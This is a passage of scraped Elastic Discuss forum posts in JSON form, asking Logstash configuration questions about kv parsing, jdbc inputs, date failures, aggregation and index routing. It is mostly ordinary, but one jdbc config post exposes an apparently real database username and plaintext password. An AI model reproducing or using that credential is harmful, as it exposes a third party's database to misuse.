    "body": "hi am trying to parse text files using a suitable filter however getting stuck, the file looks as under file name@@@@@@@@@@@@@@@@@@@@@@@@@@dummy report 1.docx data = ROUTINE REPORT from = 17 to = 70 orig = main office info = HQ Benz india office bangladesh office srilanka office activity : sales location: new delhi,34.08374 total sold: 03 dealers : XYZ Automobiles models: pqr,qws,wer activity : servicing Location: mumbai,34.08374, 74.789902 problems: engine malfunctioning, tail light problem,axle problem service centre: Das autos Date: 29052020 i need to split these something into key value pairs which are seperated by either \"=\" or \":\" . there will be a case wherein each file will have more or lesser fields or maybe os similar or dissimilar order. please suggest what should be the approach",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "ec51ad26-828a-424d-8096-7450395ebdbe",
    "url": "https://discuss.elastic.co/t/kv-filter-with-spaces-in-values/227962",
    "title": "Kv filter with spaces in values",
    "category": [
      "Logstash"
    ],
    "author": "parosio",
    "date": "April 14, 2020, 4:28pm April 14, 2020, 4:44pm April 14, 2020, 4:44pm April 15, 2020, 3:20pm",
    "body": "Hello, I've got a log that seems a perfect candidate for the kv filter: msg=Start MID 1242272 ICID 1632662 categorySignificance=/Informational catdt=Web Filtering categoryObject=/Host/Application/Service deviceSeverity=Info rt=1582506453000 and so on ... but, as you can see, there are values that contain space(s). The first field, for example, is msg and should contain Start MID 1242272 ICID 1632662, but the filter simply stops at the first space, as for the catdt field, giving: { \"msg\" => \"Start\", \"rt\" => \"1582506453000\", \"deviceSeverity\" => \"Info\", \"@timestamp\" => 2020-04-14T15:49:28.031Z, \"catdt\" => \"Web\", \"categoryObject\" => \"/Host/Application/Service\", \"@version\" => \"1\", \"categorySignificance\" => \"/Informational\", } The number of fields may vary. Is it possible to have the filter to consider as value everything from \"=\" to the first letter of the next key, where a key is anything matching a \"notspace*=\" ([^ =]+)= pattern ?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "e28a4c57-0686-4fc8-8c47-a9620f55f7b8",
    "url": "https://discuss.elastic.co/t/no-config-files-found-in-path-need-help/227915",
    "title": "No config files found in path [Need Help]",
    "category": [
      "Logstash"
    ],
    "author": "elktail",
    "date": "April 14, 2020, 12:54pm April 14, 2020, 1:00pm April 14, 2020, 1:30pm April 14, 2020, 1:34pm April 14, 2020, 4:38pm April 15, 2020, 7:43am April 15, 2020, 2:48pm",
    "body": "I am very new to ELK stack. I have installed ELK stack via debian package on Ubuntu Server. I made two changes in logstash.yml: config.reload.automatic: true config.reload.interval: 3s Despite these two changes everything is default. I did not touch pipelines.yml. I created a simple configuration file and placed it in /etc/logstash/conf.d/authlog.config and when I tail the /var/log/logstash/logstash-plain.log it shows this output that I believe should be \"Successfully started logstash API ...\" Files settings: 1 - /etc/logstash/conf.d/authlog.config input { file { path => \"/var/log/auth.log\" start_position => \"beginning\" } } filter { } output { elasticsearch { host => [\"localhost:9200\"] } } 2 - Error: logstash-error856×378 310 KB 3 - /etc/logstash/logstash.yml # Settings file in YAML # # Settings can be specified either in hierarchical form, e.g.: # # pipeline: # batch: # size: 125 # delay: 5 # # Or as flat keys: # # pipeline.batch.size: 125 # pipeline.batch.delay: 5 # # ------------ Node identity ------------ # # Use a descriptive name for the node: # # node.name: test # # If omitted the node name will default to the machine's host name # # ------------ Data path ------------------ # # Which directory should be used by logstash and its plugins # for any persistent needs. Defaults to LOGSTASH_HOME/data # path.data: /var/lib/logstash # # ------------ Pipeline Settings -------------- # # The ID of the pipeline. # # pipeline.id: main # # Set the number of workers that will, in parallel, execute the filters+outputs # stage of the pipeline. # # This defaults to the number of the host's CPU cores. # # pipeline.workers: 2 # # How many events to retrieve from inputs before sending to filters+workers # # pipeline.batch.size: 125 # # How long to wait in milliseconds while polling for the next event # before dispatching an undersized batch to filters+outputs # # pipeline.batch.delay: 50 # # Force Logstash to exit during shutdown even if there are still inflight # events in memory. By default, logstash will refuse to quit until all # received events have been pushed to the outputs. # # WARNING: enabling this can lead to data loss during shutdown # # pipeline.unsafe_shutdown: false # # ------------ Pipeline Configuration Settings -------------- # # Where to fetch the pipeline configuration for the main pipeline # # path.config: # # Pipeline configuration string for the main pipeline # # config.string: # # At startup, test if the configuration is valid and exit (dry run) # # config.test_and_exit: false # # Periodically check if the configuration has changed and reload the pipeline # This can also be triggered manually through the SIGHUP signal # config.reload.automatic: true # # How often to check if the pipeline configuration has changed (in seconds) # config.reload.interval: 3s # # Show fully compiled configuration as debug log message # NOTE: --log.level must be 'debug' # # config.debug: false # # When enabled, process escaped characters such as \\n and \\\" in strings in the # pipeline configuration files. # # config.support_escapes: false # # ------------ Module Settings --------------- # Define modules here. Modules definitions must be defined as an array. # The simple way to see this is to prepend each `name` with a `-`, and keep # all associated variables under the `name` they are associated with, and # above the next, like this: # # modules: # - name: MODULE_NAME # var.PLUGINTYPE1.PLUGINNAME1.KEY1: VALUE # var.PLUGINTYPE1.PLUGINNAME1.KEY2: VALUE # var.PLUGINTYPE2.PLUGINNAME1.KEY1: VALUE # var.PLUGINTYPE3.PLUGINNAME3.KEY1: VALUE # # Module variable names must be in the format of # # var.PLUGIN_TYPE.PLUGIN_NAME.KEY # # modules: # # ------------ Cloud Settings --------------- # Define Elastic Cloud settings here. # Format of cloud.id is a base64 value e.g. dXMtZWFzdC0xLmF3cy5mb3VuZC5pbyRub3RhcmVhbCRpZGVudGlmaWVy # and it may have an label prefix e.g. staging:dXMtZ... # This will overwrite 'var.elasticsearch.hosts' and 'var.kibana.host' # cloud.id: <identifier> # # Format of cloud.auth is: <user>:<pass> # This is optional # If supplied this will overwrite 'var.elasticsearch.username' and 'var.elasticsearch.password' # If supplied this will overwrite 'var.kibana.username' and 'var.kibana.password' # cloud.auth: elastic:<password> # # ------------ Queuing Settings -------------- # # Internal queuing model, \"memory\" for legacy in-memory based queuing and # \"persisted\" for disk-based acked queueing. Defaults is memory # # queue.type: memory # # If using queue.type: persisted, the directory path where the data files will be stored. # Default is path.data/queue # # path.queue: # # If using queue.type: persisted, the page data files size. The queue data consists of # append-only data files separated into pages. Default is 64mb # # queue.page_capacity: 64mb # # If using queue.type: persisted, the maximum number of unread events in the queue. # Default is 0 (unlimited) # # queue.max_events: 0 # # If using queue.type: persisted, the total capacity of the queue in number of bytes. # If you would like more unacked events to be buffered in Logstash, you can increase the # capacity using this setting. Please make sure your disk drive has capacity greater than # the size specified here. If both max_bytes and max_events are specified, Logstash will pick # whichever criteria is reached first # Default is 1024mb or 1gb # # queue.max_bytes: 1024mb # # If using queue.type: persisted, the maximum number of acked events before forcing a checkpoint # Default is 1024, 0 for unlimited # # queue.checkpoint.acks: 1024 # # If using queue.type: persisted, the maximum number of written events before forcing a checkpoint # Default is 1024, 0 for unlimited # # queue.checkpoint.writes: 1024 # # If using queue.type: persisted, the interval in milliseconds when a checkpoint is forced on the head page # Default is 1000, 0 for no periodic checkpoint. # # queue.checkpoint.interval: 1000 # # ------------ Dead-Letter Queue Settings -------------- # Flag to turn on dead-letter queue. # # dead_letter_queue.enable: false # If using dead_letter_queue.enable: true, the maximum size of each dead letter queue. Entries # will be dropped if they would increase the size of the dead letter queue beyond this setting. # Default is 1024mb # dead_letter_queue.max_bytes: 1024mb # If using dead_letter_queue.enable: true, the directory path where the data files will be stored. # Default is path.data/dead_letter_queue # # path.dead_letter_queue: # # ------------ Metrics Settings -------------- # # Bind address for the metrics REST endpoint # # http.host: \"127.0.0.1\" # # Bind port for the metrics REST endpoint, this option also accept a range # (9600-9700) and logstash will pick up the first available ports. # # http.port: 9600-9700 # # ------------ Debugging Settings -------------- # # Options for log.level: # * fatal # * error # * warn # * info (default) # * debug # * trace # # log.level: info path.logs: /var/log/logstash # # ------------ Other Settings -------------- # # Where to find custom plugins # path.plugins: [] # # Flag to output log lines of each pipeline in its separate log file. Each log filename contains the pipeline.name # Default is false # pipeline.separate_logs: false # # ------------ X-Pack Settings (not applicable for OSS build)-------------- # # X-Pack Monitoring # https://www.elastic.co/guide/en/logstash/current/monitoring-logstash.html #xpack.monitoring.enabled: false #xpack.monitoring.elasticsearch.username: logstash_system #xpack.monitoring.elasticsearch.password: password #xpack.monitoring.elasticsearch.hosts: [\"https://es1:9200\", \"https://es2:9200\"] # an alternative to hosts + username/password settings is to use cloud_id/cloud_auth #xpack.monitoring.elasticsearch.cloud_id: monitoring_cluster_id:xxxxxxxxxx #xpack.monitoring.elasticsearch.cloud_auth: logstash_system:password #xpack.monitoring.elasticsearch.ssl.certificate_authority: [ \"/path/to/ca.crt\" ] #xpack.monitoring.elasticsearch.ssl.truststore.path: path/to/file #xpack.monitoring.elasticsearch.ssl.truststore.password: password #xpack.monitoring.elasticsearch.ssl.keystore.path: /path/to/file #xpack.monitoring.elasticsearch.ssl.keystore.password: password #xpack.monitoring.elasticsearch.ssl.verification_mode: certificate #xpack.monitoring.elasticsearch.sniffing: false #xpack.monitoring.collection.interval: 10s #xpack.monitoring.collection.pipeline.details.enabled: true # # X-Pack Management # https://www.elastic.co/guide/en/logstash/current/logstash-centralized-pipeline-management.html #xpack.management.enabled: false #xpack.management.pipeline.id: [\"main\", \"apache_logs\"] #xpack.management.elasticsearch.username: logstash_admin_user #xpack.management.elasticsearch.password: password #xpack.management.elasticsearch.hosts: [\"https://es1:9200\", \"https://es2:9200\"] # an alternative to hosts + username/password settings is to use cloud_id/cloud_auth #xpack.management.elasticsearch.cloud_id: management_cluster_id:xxxxxxxxxx #xpack.management.elasticsearch.cloud_auth: logstash_admin_user:password #xpack.management.elasticsearch.ssl.certificate_authority: [ \"/path/to/ca.crt\" ] #xpack.management.elasticsearch.ssl.truststore.path: /path/to/file #xpack.management.elasticsearch.ssl.truststore.password: password #xpack.management.elasticsearch.ssl.keystore.path: /path/to/file #xpack.management.elasticsearch.ssl.keystore.password: password #xpack.management.elasticsearch.ssl.verification_mode: certificate #xpack.management.elasticsearch.sniffing: false #xpack.management.logstash.poll_interval: 5s",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "c945e137-a9e4-406b-b45f-ec286bbfd3f1",
    "url": "https://discuss.elastic.co/t/logstash-pq-in-conjuction-with-dlq/228086",
    "title": "Logstash PQ in conjuction with DLQ",
    "category": [
      "Logstash"
    ],
    "author": "Kalilou_Diaby",
    "date": "April 15, 2020, 10:24am April 15, 2020, 2:40pm",
    "body": "Hello, Hope everyone is safe during this covid19 crisis. I have a logstash related question, today we are using Logstash Persistent Queue which seems to me enough to guarantee once an at-least-once delivery. Is there any best practice around using Persistent Queue in conjunction with Dead Letter Queue or is DQL even needed when using PQ ? /Kalilou",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "28c54f5e-f8e0-4c7f-b383-ac6e8490ebbb",
    "url": "https://discuss.elastic.co/t/update-elastic-search-document/228102",
    "title": "Update elastic search document",
    "category": [
      "Logstash"
    ],
    "author": "hariskhalique",
    "date": "April 15, 2020, 12:25pm April 15, 2020, 2:38pm",
    "body": "Hi, I have create following conf file input { jdbc { jdbc_driver_library => \"/usr/share/java/mysql.jar\" jdbc_driver_class => \"com.mysql.jdbc.Driver\" jdbc_connection_string => \"jdbc:mysql://localhost:3309/v4qadb\" jdbc_user => \"v4qashop\" jdbc_password => \"V4admin09&#!\" jdbc_paging_enabled => true jdbc_page_size => 10000 tracking_column => \"pro_updated_date\" use_column_value=>true # statement => \"select * from `es_product_detail_info` where `pro_updated_date` >=:sql_last_value\" schedule => \"*/10 * * * *\" statement => \"SELECT `item_id`,`product_id`,`item_color_id`,`item_size_id`,`item_sku`,`item_image`,`item_price`,`brand_id`,`control_number`,`description`, `display_product_color_id`,`item_details`,`item_name`,`gender`,`pro_updated_date` ,`shopify_product_id`,`image_product_name`,`image_sort_order`, `image_title`,`image_id`,`updated_at`,`document_id`,`item_color_image`,`item_v4_size_title`,`cat_name`,`cat_shopify_collection_id` from es_product_info where `pro_updated_date` >=:sql_last_value\" } } output { elasticsearch { document_id=> \"%{document_id}\" document_type => \"doc\" index => \"product_detail_info\" hosts => [\"http://localhost:9200\"] } stdout{ codec => rubydebug } } My tracking column is base on date. My question is if I change any thing in mysql table and also update \"pro_updated_date\" to current date it should update document right ? If not then how I can achieve this ? And I want to update on real time.My logstash running in background. Should I have to create separate conf file for update ? Thanks in Advance.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f7bfcc23-93c2-4f88-9414-1bc6a007c17a",
    "url": "https://discuss.elastic.co/t/how-to-give-multiple-files-in-different-paths-as-input-to-logstash/228094",
    "title": "How to give multiple files in different paths as input to logstash",
    "category": [
      "Logstash"
    ],
    "author": "poddraj",
    "date": "April 15, 2020, 11:04am April 15, 2020, 2:35pm",
    "body": "Hi All, I have a scenario where two log files are in different directory paths but the log structure of them is same. I want to pass both of them as input files in a single config file so that the filter in it will parse the logs. Can someone please suggest the syntax to pass more than 1 log file as input in logstash.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "27de6650-1a5d-4c1b-8c99-f6db7cfdbfdd",
    "url": "https://discuss.elastic.co/t/invoke-logstash-ondemand-dynamically-like-rest-api-invocation/228135",
    "title": "Invoke Logstash Ondemand dynamically like REST API invocation",
    "category": [
      "Logstash"
    ],
    "author": "subbareddy",
    "date": "April 15, 2020, 1:50pm",
    "body": "Hi, I have logstash pipeline running in vm which pulls historical data for x months. I want to run this pipeline on demand when ever i want. here i don't have direct access to vm.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "62ab9fcf-98ec-4150-970a-3d9920264f4b",
    "url": "https://discuss.elastic.co/t/logstash-elastic-403-permission-issue/228131",
    "title": "Logstash -> Elastic 403 permission issue",
    "category": [
      "Logstash"
    ],
    "author": "",
    "date": "April 15, 2020, 1:36pm",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "4617f6b6-d588-4934-bf01-c9c8b12171b3",
    "url": "https://discuss.elastic.co/t/logstash-dont-trust-elasticsearchs-certificate/228062",
    "title": "Logstash don't trust Elasticsearch's certificate",
    "category": [
      "Logstash"
    ],
    "author": "",
    "date": "April 15, 2020, 8:54am April 15, 2020, 9:30am April 15, 2020, 11:16am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1cc2b8cb-d52e-4b25-a853-62f45d8761fa",
    "url": "https://discuss.elastic.co/t/send-multiple-output-1-at-a-time-to-another-pipeline-in-logstash/228022",
    "title": "Send multiple output 1 at a time to another pipeline in Logstash",
    "category": [
      "Logstash"
    ],
    "author": "newbie001",
    "date": "April 15, 2020, 3:41am April 15, 2020, 6:40am April 15, 2020, 7:25am April 15, 2020, 7:49am April 15, 2020, 8:06am April 15, 2020, 8:09am",
    "body": "Hi - I am very new to logstash. Is there a way on how I can send the output into another pipeline one at a time, with the unique field \"somefield\"? \"somefield\" values are from UUID function. CODE #input ODX files from local path file input { file { path => \"/Users/sample.odx\" start_position => \"beginning\" sincedb_path => \"NUL\" codec => multiline { pattern => \"^#----- Start Task -----\" negate => true what => \"previous\" max_lines => 4000 } } } filter{ mutate { add_field => {\"somefield\" => \" \"} } uuid { target => \"somefield\" overwrite => true } } #output JSON File in local output{ pipeline { send_to => [data_transform] } } current output: { \"@version\": \"1\", \"@timestamp\": \"2020-03-14T02:36:25.441Z\", \"message\": \"#Money Exchange Rate\\r\\n250\\r\\n#Date of Export\\r\\nWed Jan 20 09:40:12 2018\\r\\n#Current Exchange\\r\\nSGDUSD\\r\\n#MoneyCounter\\r\\n207 \\r\", \"tags\": [ \"multiline\" ], \"host\": \"BD001A2A\", \"somefield\": \"c657e-65e2-4312-a015-e61\" }{ \"@version\": \"1\", \"@timestamp\": \"2020-03-14T02:36:25.497Z\", \"message\": \"#----- Start Task -----\\r\\n\\r\\n#Location\\r\\nOrchard Road\\\\Singapore\\\\01ACVB\\\\125\\r\\n#Counter ID\\r\\n7008\\r\", \"tags\": [ \"multiline\" ], \"host\": \"BD001A2A\", \"somefield\": \"c9c6a2-fb81-435f-8a31-3728\" }{ \"@version\": \"1\", \"@timestamp\": \"2020-03-14T02:37:02.809Z\", \"message\": \"#----- Start Task -----\\r\\n\\r\\n#Location\\r\\nDotonburi\\\\Japan\\\\98CVBS\\\\112\\r\\n#Counter ID\\r\\n9001\\r\", \"tags\": [ \"multiline\" ], \"host\": \"BD001A2A\", \"somefield\": \"28a5c-0cd7-4b89-bb7f-fff\" } Thanks in advance!",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "d83d5662-6c3b-4541-a381-5ce6228eec7b",
    "url": "https://discuss.elastic.co/t/logstash-date-function-mapping-timestamp-ends-with-error-dateparsefailure-when-a-hour-is-02/227679",
    "title": "Logstash - Date function - Mapping timestamp ends with error _dateparsefailure when a hour is 02",
    "category": [
      "Logstash"
    ],
    "author": "vasek",
    "date": "April 12, 2020, 2:40pm April 12, 2020, 3:38pm April 12, 2020, 3:58pm April 12, 2020, 4:07pm April 15, 2020, 5:41am April 15, 2020, 5:43am",
    "body": "Hello, I figured out one thing: Logstash 7.6.0 is not able map date to @timestamp field when timestamp has 02 in hour positio. In pipeline configuration file: if [timestamp] { date { match => [\"timestamp\", \"yyyy-MM-dd HH:mm:ss,SSS\", \"yyyy-MM-dd HH:mm:ss.SSS\", \"ISO8601\" ] target => \"@timestamp\" remove_field => [\"timestamp\"] } } Grok pattern works fine. In the field timestamp is correct value, e.g.: 2020-03-29 03:35:47.392 without additional whitespaces. I simplified parser and date mapping and found out that error _dateparsefailure occur only on lines where hour is 02. 2020-03-29 02:35:47.392 INFO [xxx] Some message There is example of log file. 2020-03-29 15:35:47.392 INFO [xxx] Some message 2020-03-29 14:35:47.392 INFO [xxx] Some message 2020-03-29 13:35:47.392 INFO [xxx] Some message 2020-03-29 12:35:47.392 INFO [xxx] Some message 2020-03-29 11:35:47.392 INFO [xxx] Some message 2020-03-29 10:35:47.392 INFO [xxx] Some message 2020-03-29 09:35:47.392 INFO [xxx] Some message 2020-03-29 08:35:47.392 INFO [xxx] Some message 2020-03-29 07:35:47.392 INFO [xxx] Some message 2020-03-29 06:35:47.392 INFO [xxx] Some message 2020-03-29 05:35:47.392 INFO [xxx] Some message 2020-03-29 04:35:47.392 INFO [xxx] Some message 2020-03-29 03:35:47.392 INFO [xxx] Some message 2020-03-29 02:35:47.392 INFO [xxx] Some message 2020-03-29 01:35:47.392 INFO [xxx] Some message Is it a bug or am I doing something wrong? Vašek",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "2e3ab753-5f14-4a19-a127-9c57cbe9f53b",
    "url": "https://discuss.elastic.co/t/how-to-add-aggrigate-map-field-to-the-original-message-as-a-additional-field/227671",
    "title": "How to add aggrigate map field to the original message as a additional field",
    "category": [
      "Logstash"
    ],
    "author": "Lal_k",
    "date": "April 12, 2020, 1:16pm April 12, 2020, 2:06pm April 13, 2020, 6:49am April 13, 2020, 2:09pm April 15, 2020, 4:42am",
    "body": "I have huge amount of logs coming from Cisco ASA firewall specially firewall deny. for example i have more than 10 messages from same source IP accessing same destination with same destination port. So the idea is , instead sending 10 different messages to elastic, i want to send one aggregated message with the additional field of total_hits. my original message is like below (multiple within short period of time, say 10 event per second) 04 10 2020 16:00:34 10.1.254.26 <LOC6:INFO> Apr 10 16:00:34 host1.abc.com %ASA-6-106100: access-list GLOBAL_ACCESS_IN denied tcp OUTSIDE/1.1.1.1(51595) -> INSIDE/2.2.2.2(873) hit-cnt 1 first hit [0x93138c00, 0x00000000] here is my logstash config file input { udp { host => \"10.0.2.15\" port => 514 type => \"syslog\" } } filter { grok { match => {\"message\" => \" %{DATA:Timestamp} %{IP:Firewall_IP} %{DATA:loglevel} %{SYSLOGTIMESTAMP:date} %{IPORHOST:device} %{DATA:FW} %{WORD:policy_id} %{CISCO_ACTION:action} %{WORD:protocol} %{DATA:src_interface}\\/%{IP:src_ip}\\(%{INT:src_port}\\) %{DATA} %{DATA:dst_interface}\\/%{IP:dst_ip}\\(%{INT:dst_port}\\) %{DATA} %{INT:hit_count} %{CISCO_INTERVAL:interval} \\[%{DATA:hashcode1}, %{DATA:hashcode2}\\]\"} } mutate { remove_field => [\"@timestamp\",\"@version\",\"path\",\"host\"] } aggregate { task_id => \"%{src_ip}_%{dst_ip}_%{dst_port}\" code => \"map['total_hits'] ||= 0; map['total_hits'] += 1;\" map_action => \"create_or_update\" push_map_as_event_on_timeout => true timeout_task_id_field => \"src_ip\" timeout => 300 inactivity_timeout => 30 } } output { stdout { codec => \"rubydebug\" } } Above codes added below line at the end of every message { \"@version\" => \"1\", \"total_hits\" => 4, \"@timestamp\" => 2020-04-12T13:01:01.942Z, \"src_ip\" => \"1.1.1.1_2.2.2.2_333\" } However , what i wants to achieve to add new field called total_hit at the end of the original message. any help ?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "7bcaefb5-328f-4e22-87d2-a34d6344ddc1",
    "url": "https://discuss.elastic.co/t/sql-last-value-resets-to-0-upon-restart/228017",
    "title": "Sql_last_value resets to 0 upon restart",
    "category": [
      "Logstash"
    ],
    "author": "priyankpatel22",
    "date": "April 15, 2020, 2:37am",
    "body": "It seems the variable sql_last_value gets reset every time I restart logstash. As per the documentation and all other threads it should look at last_run_metadata_path for the last saved value. I see the last_run_metadata_path is getting updated but sql_last_value getting reset to 0 on restart. Here is my input - jdbc { jdbc_driver_library => \"C:\\sqljdbc_6.4\\enu\\mssql-jdbc-6.4.0.jre8.jar\" jdbc_driver_class => \"com.microsoft.sqlserver.jdbc.SQLServerDriver\" jdbc_connection_string => \"jdbc:sqlserver://host:1433;databaseName=db\" jdbc_user => \"user\" jdbc_password => \"pwd\" schedule => \"* * * * * *\" statement => \"SELECT * FROM dbo.IPR_LOG WHERE s_no > :sql_last_value\" use_column_value => true tracking_column_type => \"numeric\" tracking_column => \"s_no\" last_run_metadata_path => \"C:\\Users\\xyz\\.custom_log\" type => \"log\" } For the note, s_no is a \"numeric\" sql type value in the table. I am also assuming that clean_run => false by default.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "07da0657-d99a-41bd-8e31-591ee0e3defc",
    "url": "https://discuss.elastic.co/t/error-connecting-spring-microservices-to-elastic-stack/228010",
    "title": "Error connecting Spring Microservices to elastic stack",
    "category": [
      "Logstash"
    ],
    "author": "",
    "date": "April 14, 2020, 11:48pm",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "a19f265a-575f-418d-a9ad-aa586e2023cf",
    "url": "https://discuss.elastic.co/t/extract-a-mx-and-ns-records-based-on-a-field/228005",
    "title": "Extract A, MX, and NS records based on a field",
    "category": [
      "Logstash"
    ],
    "author": "mnrdammu",
    "date": "April 14, 2020, 10:20pm",
    "body": "Hi All, Is there a way to get A,MX and NS records based on a field ( which is essentially a domain name for eg: example.com) . I know we have logstash-dns-filter, but it can provide only \"A\" records. I would like to get other dns records like (MX,NS etc ) also. Any suggestions will be really helpful.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "d9ebc16d-7ea0-42b6-9814-c1b96fd2ea16",
    "url": "https://discuss.elastic.co/t/use-ssl-with-logstash-syslog-input-plugin/227831",
    "title": "Use SSL with logstash syslog input plugin",
    "category": [
      "Logstash"
    ],
    "author": "mtudisco",
    "date": "April 13, 2020, 11:39pm April 14, 2020, 12:28am April 14, 2020, 5:05pm",
    "body": "Hi, I have an installation of ELK 7.6, and i have several devices that send information to logstash via syslog. I want to secure the communication, but in the logstash syslog input plugin i dont see any parameter for ssl. Is that possible? what are the parameters for ssl in the syslog input plugin? thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "cfaca6d7-8667-4a88-a5f5-ba42a3f207a7",
    "url": "https://discuss.elastic.co/t/time-delay-between-logstash-and-elasticsearch/227749",
    "title": "Time delay between logstash and elasticsearch",
    "category": [
      "Logstash"
    ],
    "author": "honglei",
    "date": "April 13, 2020, 9:31am April 13, 2020, 2:32pm April 13, 2020, 3:46pm April 14, 2020, 2:19am April 14, 2020, 3:09am April 14, 2020, 1:30pm April 14, 2020, 8:26am April 14, 2020, 1:29pm April 14, 2020, 8:48am April 14, 2020, 8:56am April 14, 2020, 9:04am April 14, 2020, 3:20pm",
    "body": "My current pipeline is: filebeat->Logstash->ES(3 nodes). Filebeat and Logstash are deployed in the kubernetes cluster, both of the them are version-7.6.2. ES is deployed as a container on a virtual machine, images version is [amazon/opendistro-for-elasticsearch:1.6.0] I found that the logs on ES have a delay of about 7~8 minutes. Screenshot from 2020-04-13 17-10-281475×364 25.4 KB Logstash config: inputs: main: |- input { beats { port => 5044 } } filters: # main: |- # filter { # } outputs: main: |- output { elasticsearch { hosts => [\"${ELASTICSEARCH_HOST}:${ELASTICSEARCH_PORT}\"] manage_template => false index => \"XXX_%{+YYYY.MM.dd}\" user => \"XXXX\" password => \"XXX\" ilm_enabled => false } } more infomation about logstash: $ cat logstash.yml config.reload.automatic: true http.host: 0.0.0.0 http.port: 9600 path.config: /usr/share/logstash/pipeline path.data: /usr/share/logstash/data queue.checkpoint.writes: 1 queue.drain: true queue.max_bytes: 1gb queue.type: persisted $ curl -XGET 'localhost:9600/_node/stats/os?pretty' { \"host\" : \"log-logstash-0\", \"version\" : \"7.6.2\", \"http_address\" : \"0.0.0.0:9600\", \"id\" : \"9a699ca0-63ff-4d4c-bfda-6c1672603009\", \"name\" : \"log-logstash-0\", \"ephemeral_id\" : \"cacf7e7a-0a5e-426b-93d1-b50d72037c07\", \"status\" : \"green\", \"snapshot\" : false, \"pipeline\" : { \"workers\" : 2, \"batch_size\" : 125, \"batch_delay\" : 50 }, \"os\" : { \"cgroup\" : { \"cpu\" : { \"cfs_quota_micros\" : 200000, \"stat\" : { \"time_throttled_nanos\" : 10805873439, \"number_of_times_throttled\" : 198, \"number_of_elapsed_periods\" : 699951 }, \"control_group\" : \"/\", \"cfs_period_micros\" : 100000 }, \"cpuacct\" : { \"usage_nanos\" : 3358394995977, \"control_group\" : \"/\" } } } } According to prometheus indicators, logstash has a low load(cpu: 0.035, memory: 1GB). I also made a pressure test on ES, the throughput is about 6000/s. How can I figure out where the problem currently resides?",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "ed7384d0-b08e-4c3a-aa14-3b673708d8bf",
    "url": "https://discuss.elastic.co/t/how-to-write-to-a-multiple-indexes-using-single-elasticsearch-output/227870",
    "title": "How to write to a multiple indexes using single elasticsearch output?",
    "category": [
      "Logstash"
    ],
    "author": "artur_m",
    "date": "April 14, 2020, 8:21am April 14, 2020, 1:17pm April 14, 2020, 1:18pm",
    "body": "Hey folks, i'm pretty new guy for ELK stack, so don't judge me too much. So we have a basic fresh ELK setup v 7.6.2 with basic licence enabled. We are using filebeat to gather logs and send them to logstash. After that we need to write those logs to a 3 different indexes depending on field (field.env:[stage|preprod|prod]) We created this field using filebeat config with entry like this: fields: env: stage ILM policy is on by default (but i assume we can live without it in future) So we tried something like this - https://www.elastic.co/guide/en/logstash/current/plugins-outputs-elasticsearch.html#_writing_to_different_indices_best_practices And my logstash config was smthing like that: input { beats { port => 5044 host => \"******\" } } filter { if [field.env] == stage { mutate { add_field => { \"[@metadata][logstash-2020.04.06-000001]\" => \"stage-%{+YYYY.MM}\" } } } else if [field.env] == \"preprod\" { mutate { add_field => { \"[@metadata][logstash-2020.04.06-000001]\" => \"preprod-%{+YYYY.MM.dd}\" } } } else { mutate { add_field => { \"[@metadata][logstash-2020.04.06-000001]\" => \"prod-%{+YYYY}\" } } } } output { elasticsearch { hosts => [\"127.0.0.1:9200\"] user => \"elastic\" password => \"******\" } } logstash-2020.04.06-000001 - is a default index created by logstash After creating this config file all stack was restarted, all services were up and running without any errors. But, logstash was continuing to write all logs to default index, witch is logstash-2020.04.06-000001. So i need an advise: what logstash config need to look like to create and write to a different indexes with mentioned requirements? what do we need to turn off to be able to do that, like ILM or smthng? Thank you for your help!!!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1fa3ca6a-ab03-47bd-9f2b-8fcdcfcf1de4",
    "url": "https://discuss.elastic.co/t/best-way-to-parse-events-filebeat-module-logstash-plugin-logstash-input-filter/227916",
    "title": "Best way to parse events (filebeat module/logstash plugin/logstash input filter)",
    "category": [
      "Logstash"
    ],
    "author": "s34g4r",
    "date": "April 14, 2020, 12:55pm",
    "body": "I've installed and configured elasticstack on CentOS 8, using the packages in the elasticsearch repos. Once of the first log sources I'm toying with is mod_security. Of course, the format of these logs is totally brutal, so it's been challenging. I see quite a bit of work has been to make this easier, but I'm struggling with the \"best\" or most \"efficient\" way to ingest/parse these. I've seen a filterset for mod_security on github (https://github.com/bitsofinfo/logstash-modsecurity). Can I just feed these logs via a standard filebeats module and use this logstash filter set to parse them? Do I need to create a custom filebeats module to get these logs into logstash? I've seen a logstash plugin to parse these (https://github.com/isaaceindhoven/logstash-filter-modsec). Does this make more sense than using the filter set? Would I need custom filebeats modules to feed these logs in? There are just so many options and approaches, I'm not confident in which route is the more standard or the more efficient. Any advice would be helpful. Thanks for any help!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "d80fc8cb-71fb-4c5e-9516-8e9ed9466c1b",
    "url": "https://discuss.elastic.co/t/logstash-ip-data-type/227879",
    "title": "Logstash ip data type",
    "category": [
      "Logstash"
    ],
    "author": "Mohammad_Mousavi",
    "date": "April 14, 2020, 9:43am April 14, 2020, 10:59am",
    "body": "Hi, I have this in grok : %{IP:clientip}, but in Kibana in index mapping I see: \"clientip\": { \"type\": \"text\", \"norms\": false, \"fields\": { \"keyword\": { \"type\": \"keyword\", \"ignore_above\": 256 I can't use kibana filter based on IP range, I guess this is the reason. Should I reindex my indexes? How ? and what's wrong with logstash ? should I use some mutate to convert ? Thanx a lot.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "66495b57-54f1-4bc5-a99d-e685dc803962",
    "url": "https://discuss.elastic.co/t/looking-for-a-way-size-of-log-event/224805",
